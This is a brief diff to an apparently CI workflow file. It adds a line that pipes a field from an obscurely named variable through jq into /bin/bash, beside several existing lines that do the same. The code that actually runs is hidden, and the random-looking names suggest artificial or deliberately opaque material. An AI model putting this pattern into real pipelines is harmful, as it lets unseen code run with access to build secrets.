@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$sioa6181" | jq -r .j62430 | /bin/bash
           printf '%s' "$o6" | jq -r .r30 | /bin/bash
           printf '%s' "$v300" | jq -r .i64 | /bin/bash
+          echo $tvyi9 | jq -r .swcwa8717 | /bin/bash
 
       - name: Upload results
         if: always()
